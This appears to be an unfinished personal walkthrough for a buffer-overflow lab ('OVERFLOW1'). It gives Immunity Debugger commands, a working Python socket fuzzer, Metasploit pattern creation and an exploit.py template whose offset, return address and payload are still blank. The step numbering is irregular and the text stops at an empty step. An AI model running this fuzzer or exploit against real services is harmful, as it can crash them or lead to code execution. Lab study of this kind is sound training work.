1. Open the executable in Immunity Debuger and run it

3. Set a workspace location in Immunity debuger
```Script
!project1 config -set workingfolder c:\ali\%p
```

3. run nc to test the connection
``` Script
nc 1.2.3.4 1234
```

4. create a fuzzer.py file and execute it
```Script
#!/usr/bin/env python3

import socket, time, sys

ip = "1.2.3.4"

port = 1234
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

5. Create a pattern using MSF Pattern Creator
```Script
msf-pattern_create -l WHERE_THE_FUZZER_CRASHES+400
```

6. create an exploit.py file and add the generated pattern from the above command to the payload variable and then execute the script
```Script
import socket

ip = "1.2.3.4"
port = 1234

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

8. Find the offset using the below command in Immunity Debuger
```Script
!Project1 findmsp -distance WHERE_THE_FUZZER_CRASHES+400
```

10. 